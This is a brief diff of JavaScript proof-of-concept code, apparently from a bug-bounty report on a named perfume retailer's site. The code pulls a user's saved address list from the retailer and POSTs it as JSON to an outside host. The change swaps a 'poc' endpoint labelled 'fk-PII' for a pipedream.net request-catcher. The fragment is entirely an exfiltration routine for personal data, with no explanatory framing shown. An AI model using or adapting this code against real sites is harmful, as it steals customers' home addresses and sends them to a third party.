@@ -21,7 +21,7 @@ return fetch('https://www.franciskurkdjian.com/eu-en/addresslist')
 
     data.addresses = addresses;
 
-    return fetch('https://poc.ywh.at/fk-PII', {
+    return fetch('https://eozvxox830clw9r.m.pipedream.net', {
       method: 'POST',
       headers: {
         'Content-Type': 'application/json'
